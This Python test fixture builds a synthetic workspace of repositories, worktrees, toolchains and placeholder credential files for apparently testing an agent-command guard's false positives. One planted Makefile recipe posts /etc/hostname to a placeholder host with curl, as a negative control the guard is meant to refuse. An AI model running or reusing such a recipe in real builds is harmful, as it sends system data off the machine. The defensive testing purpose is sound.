"""Synthetic, sanitized workspace for the per-PR benign false-positive gate.

Everything lives under one temporary root. Nothing here references a real user
path, private repository, or network host. The layout deliberately mirrors the
shapes that real agent sessions run in and that a bare ``git init`` fixture
never exercises:

* a parent repository that contains an untracked nested child repository;
* a linked worktree of the parent, used as the working directory;
* a global gitconfig with ``filter.lfs.*`` in the fixture HOME;
* a project skill document, a ``[slug]`` route directory and a file whose name
  resembles a credential workflow but is ordinary source;
* a second repository with a tracked gitlink plus a filter attribute, the one
  git shape that must keep requiring review;
* repositories below HOME in a parent directory that is not itself a
  repository (``~/Code/org/app-portal`` and ``~/Code/org/service-api``), each
  with ``.github`` metadata, the layout agents use when they search a child
  repository by absolute path or inspect a sibling with ``git -C``;
* a linked worktree of ``app-portal`` beside the ``org`` directory on a feature branch whose
  ``origin`` is a hosted remote, and plan notes under a HOME dot directory: the shape of a session
  started in a non-repository parent directory that works in an external worktree;
* an installed, gitignored ``node_modules`` in the working directory with the
  project's locked CLI packages, so a runner such as ``npx`` resolves to a
  content-hashed local binary instead of a registry fetch;
* connectors that need setup: a ``lanectl`` CLI in ``~/.local/bin`` with a ``~/.lanectl``
  state directory, and a Codex MCP config with a stdio and a remote server;
* the rest of a working project's toolchain in that same directory: the type
  checker, linter, formatter and task runner npm links into ``node_modules``,
  a ``.venv`` holding the console scripts ``uv sync`` installs, and the
  ``Makefile``, ``go.mod`` and ``Cargo.toml`` entry points. A real checkout is
  rarely all of these at once, but each is a command shape agents run dozens of
  times an hour, and none of them is interesting enough to review.
"""

from __future__ import annotations

import json
import os
import secrets
import shutil
import tempfile
from dataclasses import dataclass
from pathlib import Path

import pytest

from ci.gauntlet.edge_clone_fixtures import write_edge_clone
from ci.gauntlet.fixtures import BENCH_CHECKOUT, BENCH_FILES
from ci.gauntlet.realism_fixtures import REVIEW_NOTES, SESSION_SOURCE
from ci.gauntlet.source_output_fixtures import SOURCES as TOKEN_SOURCES
from codex_plugin_scanner.guard.adapters import codex_contained_tests
from tests.benign_fp_gate_configs import KUBECONFIG, LFS_GITCONFIG
from tests.benign_fp_gate_connectors import write_connectors
from tests.benign_fp_gate_developer_checkout import head_commit, write_developer_checkout
from tests.benign_fp_gate_feature_app import build_feature_app, feature_app_path
from tests.benign_fp_gate_git import _git, _session_worktree, _stopped_rebase
from tests.benign_fp_gate_hooked_clone import hooked_worktree_path, write_hooked_clone
from tests.benign_fp_gate_long_lived_clone import write_long_lived_clones
from tests.benign_fp_gate_projects import (
    _INSTALLED_PACKAGES,
    _NODE_PACKAGES,
    COMMITTED_SOURCE,
    _application_database,
    _build_toolchain,
    _bun_lockfile,
    _node_package,
    _node_toolchain,
    _python_toolchain,
    _sibling_test_runner,
    _write,
)


@dataclass(frozen=True)
class BenignFixture:
    root: Path
    home: Path
    parent: Path
    worktree: Path
    nested: Path
    gitlink_repo: Path
    guard_home: Path
    private_tmp: Path
    tmp_worktree: Path
    org: Path
    tmp_org: Path
    scratch: Path
    stage: Path
    # The same worktree named through a linked ancestor, as a macOS host spells
    # any `/tmp` checkout: `/tmp` resolves to `/private/tmp`.
    linked_worktree: Path

    def cleanup(self) -> None:
        """Remove the directories this fixture created outside its own root."""
        shutil.rmtree(self.private_tmp, ignore_errors=True)
        shutil.rmtree(self.contained_requests, ignore_errors=True)
        shutil.rmtree(self.tmp_worktree.parent, ignore_errors=True)
        shutil.rmtree(self.tmp_org.parent, ignore_errors=True)
        shutil.rmtree(self.scratch, ignore_errors=True)
        shutil.rmtree(self.stage, ignore_errors=True)
        self.scratch_copy.unlink(missing_ok=True)
        self.scratch_patch.unlink(missing_ok=True)

    @property
    def scratch_patch(self) -> Path:
        """A patch kept straight in /tmp, as agents keep one to check before applying."""
        return Path(f"{self.scratch}-fix.patch")

    @property
    def scratch_copy(self) -> Path:
        """A saved file straight in /tmp, next to the scratch leaf, that a chain may inspect."""
        return Path(f"{self.scratch}-report-main.ts")

    @property
    def contained_requests(self) -> Path:
        """Where routed contained runs write their request files."""
        return self.root / "contained-requests"

    def tokens(self) -> dict[str, str]:
        return {
            "${HOME}": str(self.home),
            "${PARENT}": str(self.parent),
            "${WORKTREE}": str(self.worktree),
            "${NESTED}": str(self.nested),
            "${GITLINK_REPO}": str(self.gitlink_repo),
            "${PRIVATE_TMP}": str(self.private_tmp),
            "${ORG}": str(self.org),
            "${ORG_WT}": str(self.org.parent / "app-portal-fix"),
            "${ORG_CLONE}": str(self.org.parent / "app-portal-clone"),
            "${PORTAL_WEB_HEAD}": head_commit(self.org),
            "${TMP_ORG}": str(self.tmp_org),
            "${TMP_ORG_WT}": str(self.tmp_org.parent / "app-followup"),
            "${TMP_REMOTE}": str(self.tmp_org.parent / "remote" / "app.git"),
            # The live Gauntlet's fixture root and its fresh scratch leaf directly in /tmp.
            "${GAUNTLET_ROOT}": str(self.tmp_org.parent),
            "${SCRATCH}": str(self.scratch),
            "${FEATURE_APP}": str(feature_app_path(self.home)),
            # Private directory directly in /tmp holding the files a case stages before its commands.
            "${STAGE}": str(self.stage),
            # Left unresolved on purpose: the link is what the case is about.
            "${LINKED_WORKTREE}": str(self.linked_worktree),
        }

    def cwd(self, name: str) -> Path:
        return {
            "worktree": self.worktree,
            "worktree_app": self.worktree / "app",
            "parent": self.parent,
            "nested": self.nested,
            "tmp_worktree": self.tmp_worktree,
            "gitlink_repo": self.gitlink_repo,
            "org": self.org,
            "edge_clone": self.home / "edge-clone",
            "org_app": self.org / "app-portal",
            "org_wt": self.org.parent / "app-portal-fix",
            "org_clone": self.org.parent / "app-portal-clone",
            "org_hooked": hooked_worktree_path(self.org),
            "tmp_org": self.tmp_org,
            "org_rebase": self.org.parent / "app-portal-rebase",
            "org_rebase_exec": self.org.parent / "app-portal-rebase-exec",
            # A checkout whose `.gitignore` re-includes a hidden template, as most application repositories do.
            "ignore_negation": self.home / "Code" / "ignore-rules" / "billing-api",
            "feature_app": feature_app_path(self.home),
            "linked_worktree": self.linked_worktree,
        }[name]


def _system_tmp() -> str:
    """Use /tmp itself where it exists, the place real agents create scratch directories."""
    return "/tmp" if Path("/tmp").is_dir() else tempfile.gettempdir()


def build_fixture(root: Path) -> BenignFixture:
    root = root.resolve()
    home = root / "home"
    parent = root / "projects" / "parent-repo"
    nested = parent / "tools" / "nested-repo"
    worktree = root / "projects" / "parent-repo-feature"
    gitlink_repo = root / "projects" / "gitlink-repo"
    guard_home = root / "guard-home"
    for directory in (home, guard_home):
        directory.mkdir(parents=True)
    _write(home / ".gitconfig", LFS_GITCONFIG)
    _write(home / ".rustup" / "settings.toml", 'version = "12"\ndefault_toolchain = "stable"\n')
    _write(home / ".agent" / "skills" / "x" / "SKILL.md", "---\nname: x\n---\nSynthetic home skill body.\n")
    _write(home / ".agent" / "artifacts" / "report.md", "# Report\nInert build report text.\n")
    _write(home / ".agents" / "skills" / "x" / "SKILL.md", "---\nname: x\n---\nSynthetic home skill body.\n")
    _write(home / ".config" / "app-portal" / "settings.json", '{"theme": "dark"}\n')
    # A tool Guard knows no name for, with the two trees every one of them
    # keeps: a skills folder and a lane of dated reports. Agents look both up
    # by the word they remember, which is the shape `.agents` already covers
    # and no other home dot directory did.
    _write(
        home / ".web-client" / "skills" / "usage-rollup" / "SKILL.md",
        "---\nname: usage-rollup\n---\nSynthetic home skill body.\n",
    )
    _write(
        home / ".web-client" / "skills" / "usage-rollup" / "scripts" / "collect.sh",
        "#!/bin/sh\necho fixture\n",
    )
    _write(home / ".web-client" / "artifacts" / "2026-10" / "run.log", "inert run log\n")
    _write(
        home / ".report-lane" / "usage-rollup" / "2026-10" / "web-client-summary.md",
        "# Summary\nInert report text.\n",
    )
    # Ordinary files below a hidden home directory: a Node toolchain's manifest
    # and a repository's own workflow. The hidden component is all that sets
    # them apart from any other read.
    _write(
        home / ".nvm/versions/node/v25.2.1/lib/node_modules/inert-pkg/package.json",
        '{\n  "name": "inert-pkg",\n  "version": "3.1.0"\n}\n',
    )
    _write(
        home / ".github/workflows/inert-check.yml",
        "name: inert-check\non: [push]\njobs:\n  check:\n    runs-on: ubuntu-latest\n",
    )
    # Negative controls for the same screen: a credential store nested under
    # `.config`, and a token-shaped file name in an otherwise ordinary place.
    _write(home / ".config/gcloud/credentials.db", "synthetic fixture\n")
    _write(home / ".agents/skills/x/credentials.json", "{}\n")
    # A directory of local services an agent runs beside its checkouts. The
    # running server leaves a hidden socket lock in its run directory, which
    # is all that separates this tree from any other listing.
    _write(home / "dev-services" / "compose.yaml", "services:\n  db:\n    image: postgres:16\n")
    _write(home / "dev-services" / "scripts" / "start.sh", "#!/bin/sh\necho start\n")
    _write(home / "dev-services" / "pg-run" / ".s.PGSQL.5432.lock", "4242\n")
    _write(home / "other-project" / "notes.md", "Notes kept outside the project.\nretry policy: three attempts.\n")
    _write(home / "other-project" / "src" / "report.ts", "export const reportWindow = 'report-window-marker';\n")
    _write(home / "other-project" / "package.json", '{\n  "name": "@acme/app",\n  "version": "1.0.0"\n}\n')
    _write(home / "other-project" / ".keep", "")
    # Sibling checkout's committed lockfile: the probe that globs for one has to
    # find it, or the read is allowed for naming nothing rather than for being safe.
    _write(
        home / "other-project" / "package-lock.json",
        json.dumps({"lockfileVersion": 3, "packages": {"node_modules/left-pad": {"version": "1.3.0"}}}) + "\n",
    )
    _write(home / "acme-plain" / "README.txt", "Plain notes directory.\n")
    _write(home / "acme-plain" / "probe_py.py", "print('probe')\n")
    _write(home / "kubeconfig.yaml", KUBECONFIG)
    # Connectors Guard has no decision for: a local CLI with its state directory, and harness MCP servers.
    write_connectors(home)
    _write(home / ".ssh" / "id_rsa", "-----BEGIN FIXTURE KEY-----\nnot-a-real-key\n-----END FIXTURE KEY-----\n")
    # Sibling repository outside the workspace, as in the live Gauntlet fixture.
    _git(home / "other-project", "init", "--quiet", "--initial-branch=main", home=home)
    _git(home / "other-project", "add", "-A", home=home)
    _git(home / "other-project", "commit", "--quiet", "-m", "sibling base", home=home)
    _git(
        home / "other-project",
        "worktree",
        "add",
        "--quiet",
        "-b",
        "fix/report-window",
        str(home / "other-project-wt"),
        home=home,
    )
    # Installed after the baseline commit, as an untracked `npm install` leaves it.
    _sibling_test_runner(home / "other-project")

    parent.mkdir(parents=True)
    _git(parent, "init", "--quiet", "--initial-branch=main", home=home)
    _write(parent / "README.md", "# Parent\n")
    _write(parent / "src" / "one.ts", "export const one = 1;\n")
    # The one committed file long enough for a range-limited read of its history.
    _write(parent / "src" / "report-window.ts", COMMITTED_SOURCE)
    _write(parent / "src" / "password-reset-email.tsx", "export const Email = () => null;\n")
    _write(parent / "app" / "registry" / "[slug]" / "page.tsx", "export default function Page() { return null; }\n")
    _write(parent / ".agents" / "skills" / "x" / "SKILL.md", "---\nname: x\n---\nSynthetic skill body.\n")
    # Git treats a link as a file, so `node_modules/` alone leaves the borrowed
    # `dashboard/node_modules` link below unignored.
    _write(parent / ".gitignore", "node_modules/\ndashboard/node_modules\n")
    _git(parent, "add", "-A", home=home)
    _git(parent, "commit", "--quiet", "-m", "fixture base", home=home)
    _git(parent, "worktree", "add", "--quiet", "-b", "feature", str(worktree), home=home)
    # An existing branch no worktree has checked out, for `git worktree add <path> <branch>`.
    _git(parent, "branch", "feat/other-branch", home=home)
    _node_toolchain(worktree, tools=True)
    _bun_lockfile(worktree, _INSTALLED_PACKAGES)
    _python_toolchain(worktree)
    _build_toolchain(worktree)
    _write(worktree / "test_calc.py", "assert 1 + 1 == 2\nprint('ok')\n")
    _write(worktree / "scripts" / "rebuild.sh", "#!/bin/sh\necho rebuilt\n")
    # Reply drafted for a PR review conversation, posted with `gh pr comment --body-file`.
    _write(worktree / ".tmp" / "body.md", "Fixed in the latest push; the parser now rejects empty input.\n")
    # The application database a session opens with `sqlite3` to read its tables.
    _application_database(worktree / ".tmp" / "app.db")
    # Worktree package borrowing the canonical checkout's installed node_modules through a symlink.
    _node_toolchain(parent / "dashboard")
    _write(worktree / "dashboard" / "package.json", (parent / "dashboard" / "package.json").read_text())
    (worktree / "dashboard" / "node_modules").symlink_to(parent / "dashboard" / "node_modules")
    # The live Gauntlet's placeholder docs and field-copy source, read by its shell cases.
    _write(worktree / "docs" / "review-notes.md", REVIEW_NOTES)
    _write(worktree / "dashboard" / "src" / "session.js", SESSION_SOURCE)
    # The live Gauntlet's token-handling sources (redirect route, link worker, HMAC helper).
    for relative, text in TOKEN_SOURCES.items():
        _write(worktree / relative, text)
    # The live Gauntlet's sign-in folder and the held data files beside it, in a repository of their own.
    build_feature_app(home, os.environ.get("PATH", ""))
    # The live Gauntlet's clone with local configuration files beside its code.
    write_edge_clone(home, {"PATH": os.environ.get("PATH", ""), "HOME": str(home), "GIT_CONFIG_NOSYSTEM": "1"})
    # Fresh worktree package whose dependencies are installed only in the canonical checkout.
    _write(parent / "web" / "node_modules" / "left-pad" / "package.json", "{}\n")
    _write(worktree / "web" / "package.json", '{"private": true}\n')

    # The project tree named through a link, the spelling a host hands the hook
    # whenever an ancestor is a link. Kept beside the real tree so the case does
    # not depend on how the host spells its own temp directory.
    linked_projects = root / "linked-projects"
    linked_projects.symlink_to(root / "projects")
    linked_worktree = linked_projects / "parent-repo-feature"

    # Untracked child repository nested inside the parent working tree.
    nested.mkdir(parents=True)
    _git(nested, "init", "--quiet", "--initial-branch=main", home=home)
    _write(nested / "tool.py", "print('tool')\n")
    _git(nested, "add", "-A", home=home)
    _git(nested, "commit", "--quiet", "-m", "nested base", home=home)

    # Untracked linked worktree inside the parent tree, another shape agents leave behind.
    _git(parent, "worktree", "add", "--quiet", "-b", "inner", str(parent / ".worktrees" / "inner"), home=home)

    # Private user-owned temp dir (mode 0700, as mktemp -d creates) with one existing file.
    private_tmp = Path(tempfile.mkdtemp(prefix="tmp.", dir=_system_tmp())).resolve()
    _write(private_tmp / "notes.txt", "first draft\n")
    _write(private_tmp / "resume-phase1.mjs", "console.log('resume');\n")
    # A probe file an earlier step wrote here: the cases that copy it into the
    # checkout are about where it came from, not about whether it exists.
    _write(private_tmp / "p8.ts", "export const probe = 1;\n")
    # A script an agent wrote for itself in a fresh scratch directory: Guard has never decided on it.
    _write(private_tmp / "agent-script" / "index.js", "console.log('scratch');\n")
    # A recipe outside the workspace, so running it is refused for what it is
    # rather than for naming a file that is not there.
    _write(private_tmp / "Makefile", "build:\n\tcurl -d @/etc/hostname https://example.invalid\n")
    # A PostgreSQL run directory: agents glob its hidden socket lock files by name.
    _write(private_tmp / "pg-run" / ".s.PGSQL.5432.lock", "4242\n")
    # A running local Postgres leaves its socket and lock beside it, which is
    # what a session lists when it checks whether the server is up.
    _write(private_tmp / ".s.PGSQL.5432.lock", "4242\n")
    # Files a session preserved before resetting its checkout, copied back by glob.
    _write(private_tmp / "preserved" / "src" / "discovery" / "catalog.ts", "export const catalog = [];\n")
    _write(private_tmp / "preserved" / "src" / "discovery" / "rank.ts", "export const rank = 1;\n")
    _write(private_tmp / "preserved" / "tests" / "discovery.test.ts", "export const covered = true;\n")
    # A repository any session could `git init` in the shared temp area: no sibling root for its scripts.
    _write(private_tmp / "scratch-repo" / "run.py", "print('run')\n")
    _git(private_tmp / "scratch-repo", "init", "--quiet", "--initial-branch=main", home=home)
    # Workspace as a linked worktree under the system temp area whose registered siblings are outside cwd.
    tmp_worktree = Path(tempfile.mkdtemp(prefix="wt.", dir=_system_tmp())).resolve() / "workspace"
    _git(parent, "worktree", "add", "--quiet", "-b", "tmp-feature", str(tmp_worktree), home=home)

    # Tracked gitlink plus a filter attribute: must remain reviewable.
    gitlink_repo.mkdir(parents=True)
    _git(gitlink_repo, "init", "--quiet", "--initial-branch=main", home=home)
    _write(gitlink_repo / ".gitattributes", "sub filter=lfs\n*.bin filter=lfs\n")
    _write(gitlink_repo / "readme.txt", "gitlink fixture\n")
    _git(gitlink_repo, "add", "-A", home=home)
    _git(
        gitlink_repo,
        "update-index",
        "--add",
        "--cacheinfo",
        f"160000,{_git(nested, 'rev-parse', 'HEAD', home=home)},sub",
        home=home,
    )
    _git(gitlink_repo, "commit", "--quiet", "-m", "gitlink base", home=home)

    # Repositories below HOME whose shared parent is not a repository.
    org = home / "Code" / "org"
    for name in ("app-portal", "service-api"):
        repository = org / name
        repository.mkdir(parents=True)
        _git(repository, "init", "--quiet", "--initial-branch=main", home=home)
        _write(repository / ".github" / "workflows" / "ci.yml", "name: ci\n")
        _write(repository / "src" / "index.ts", f"export const name = '{name}';\n")
        _write(repository / "README.md", f"# {name}\n")
        _write(repository / "src" / "lib.rs", 'pub fn name() -> &\'static str {\n    "fixture"\n}\n')
        if name == "service-api":
            _write(repository / "contracts" / "commands.json", '{"commands": []}\n')
            _write(repository / "validation" / "schema.json", '{"type": "object"}\n')
            _write(repository / "rust" / "crates" / "catalog" / "src" / "lib.rs", "pub fn catalog_read() {}\n")
            _write(repository / "src" / "daemon" / "read.py", "print('daemon read')\n")
            # A real target, so the sibling `.env` negative controls prove a refusal.
            _write(repository / ".env", "TOKEN=synthetic-not-a-secret\n")
            _write(repository / ".gitignore", "node_modules/\n")
            _node_toolchain(repository / "dashboard")
            _sibling_test_runner(repository)
        _git(repository, "add", "-A", home=home)
        _git(repository, "commit", "--quiet", "-m", f"{name} base", home=home)
        if name == "service-api":
            _git(repository, "remote", "add", "origin", "https://github.com/example-org/service-api.git", home=home)
            _git(repository, "update-ref", "refs/remotes/origin/main", "HEAD", home=home)
    # A sibling checkout that keeps no workflows, where a probe finds nothing.
    docs_site = org / "docs-site"
    _write(docs_site / "README.md", "# docs-site\n")
    _git(docs_site, "init", "--quiet", "--initial-branch=main", home=home)
    _git(docs_site, "add", "-A", home=home)
    _git(docs_site, "commit", "--quiet", "-m", "docs-site base", home=home)
    _session_worktree(org, home)
    write_developer_checkout(org, home, _git, _write)
    write_hooked_clone(org, home, _git)
    # Years-old clones gaining sibling worktrees, one with a post-checkout hook.
    write_long_lived_clones(home, _git)
    _stopped_rebase(org, home, "app-portal-rebase")
    # A rebase started with an `exec` step keeps that program in its saved todo list.
    _stopped_rebase(org, home, "app-portal-rebase-exec", "-x", "true")
    # Repositories whose `.gitignore` re-includes literal paths: an ordinary
    # kept file and editor setting, and a `.env` template that stays reviewed.
    for name, ignore, files in (
        (
            "web-console",
            "dist/\n*.log\n!keep.log\n.vscode/*\n!.vscode/settings.json\n",
            {"keep.log": "kept\n", ".vscode/settings.json": "{}\n", "src/index.ts": "export const route = 1;\n"},
        ),
        (
            "billing-api",
            ".env*\n!.env.example\n",
            {".env.example": "TOKEN=synthetic-not-a-secret\n", "src/index.ts": "export const route = 2;\n"},
        ),
    ):
        repository = home / "Code" / "ignore-rules" / name
        repository.mkdir(parents=True)
        _git(repository, "init", "--quiet", "--initial-branch=main", home=home)
        _write(repository / ".gitignore", ignore)
        for relative, text in files.items():
            _write(repository / relative, text)
        _git(repository, "add", "-A", home=home)
        _git(repository, "commit", "--quiet", "-m", f"{name} base", home=home)
    # A non-repository parent under /tmp whose repository has a linked worktree beside the parent.
    tmp_org = Path(tempfile.mkdtemp(prefix="org.", dir=_system_tmp())).resolve() / "org"
    (tmp_org / "app").mkdir(parents=True)
    _git(tmp_org / "app", "init", "--quiet", "--initial-branch=main", home=home)
    _write(tmp_org / "app" / "README.md", "# app\n")
    _write(home / ".nvm" / "versions" / "node" / "v25.2.1" / "lib" / "node_modules" / "npm" / "package.json", "{}\n")
    _write(home / ".bun" / "install" / "global" / "node_modules" / "vite" / "package.json", "{}\n")
    # Installed dependency and toolchain source under hidden home directories.
    pipx_site = home / ".local" / "pipx" / "venvs" / "tool" / "lib" / "python3.12" / "site-packages"
    _write(pipx_site / "pkg" / "mod.py", "_COLD_START = 0.5\n")
    _write(home / ".local" / "lib" / "python3.12" / "site-packages" / "pkg" / "mod.py", "X = 1\n")
    _write(home / ".cargo" / "registry" / "src" / "index" / "serde-1.0.0" / "src" / "lib.rs", "pub fn serde() {}\n")
    rustlib_core = home / ".rustup" / "toolchains" / "stable" / "lib" / "rustlib" / "src" / "rust" / "library" / "core"
    _write(rustlib_core / "src" / "lib.rs", "//! core\n")
    _write(tmp_org / "app" / "package.json", '{"name": "app", "version": "1.0.0"}\n')
    _write(tmp_org / "app" / "src" / "index.ts", "export const railStage = 1;\n")
    _write(tmp_org / "app" / "tests" / "index.test.ts", "import { railStage } from '../src';\n")
    _write(tmp_org / "app" / "scripts" / "report.py", "print('report')\n")
    _write(tmp_org / "app" / ".gitignore", "node_modules/\n")
    _git(tmp_org / "app", "add", "-A", home=home)
    _git(tmp_org / "app", "commit", "--quiet", "-m", "app base", home=home)
    # Installed, gitignored runner under the scratch checkout: agents list its
    # `.bin` shim from a sibling, and a recursive grep over this checkout has
    # to walk the package store the way a real one does.
    _node_package(tmp_org / "app", "vitest", _NODE_PACKAGES["vitest"])
    followup = str(tmp_org.parent / "app-followup")
    _git(tmp_org / "app", "worktree", "add", "--quiet", "-b", "followup", followup, home=home)
    # This worktree ran its own install, unlike ``app-portal-fix`` above, so
    # sharing the main checkout's package store here meets a directory already
    # standing at that name and the link lands inside it.
    _node_package(Path(followup), "vitest", _NODE_PACKAGES["vitest"])
    remote = tmp_org.parent / "remote" / "app.git"
    _git(tmp_org.parent, "clone", "--quiet", "--bare", str(tmp_org / "app"), str(remote), home=home)
    _git(tmp_org / "app", "remote", "add", "origin", str(remote), home=home)
    # A benchmark checkout outside HOME whose test vectors are named for secrets and tokens.
    bench = tmp_org.parent / BENCH_CHECKOUT
    for relative, text in BENCH_FILES.items():
        _write(bench / relative, text)
    _git(bench, "init", "--quiet", "--initial-branch=main", home=home)
    _git(bench, "add", "-A", home=home)
    _git(bench, "commit", "--quiet", "-m", "bench base", home=home)
    # A leaf directly in /tmp that does not exist yet, as a throwaway checkout destination.
    scratch = Path(_system_tmp()) / f"hg-fp-scratch-{os.getpid()}-{secrets.token_hex(4)}"
    # Source files a session staged in /tmp before copying them into a checkout.
    stage = Path(tempfile.mkdtemp(prefix="hg-fp-stage-", dir=_system_tmp())).resolve()
    _write(stage / "x.ts", "export const summary = 2;\n")
    _write(stage / "a.ts", "export const copied = 3;\n")
    fixture = BenignFixture(
        root,
        home,
        parent,
        worktree,
        nested,
        gitlink_repo,
        guard_home,
        private_tmp,
        tmp_worktree,
        org,
        tmp_org,
        scratch,
        stage,
        linked_worktree,
    )
    _write(fixture.scratch_copy, "export const reportWindow = 'report-window-marker';\n")
    _write(
        fixture.scratch_patch,
        "diff --git a/src/report.ts b/src/report.ts\n--- a/src/report.ts\n+++ b/src/report.ts\n"
        "@@ -1 +1 @@\n-export const reportWindow = 'report-window-marker';\n+export const reportWindow = '24h';\n",
    )
    return fixture


def route_codex(result: dict[str, object], payload: dict[str, object], fixture: BenignFixture) -> dict[str, object]:
    """Run the real Codex bridge rewrite for a Codex release that applies ``updatedInput``.

    Codex before 0.131 keeps the denial with an update hint, so the gates model
    0.131 or later and say nothing about older releases. The contained request
    file goes to the fixture's own directory, which ``cleanup`` removes.
    """
    with pytest.MonkeyPatch.context() as patch:
        patch.setattr(codex_contained_tests, "launching_codex_executable", lambda: Path("/usr/local/bin/codex"))
        patch.setattr(codex_contained_tests, "codex_applies_updated_input", lambda *_args, **_kwargs: True)
        fixture.contained_requests.mkdir(exist_ok=True)
        patch.setattr(tempfile, "tempdir", str(fixture.contained_requests))
        return codex_contained_tests.route_codex_containment(
            dict(result),
            hook_input=json.dumps(payload),
            guard_home=fixture.guard_home,
            home_dir=fixture.home,
        )
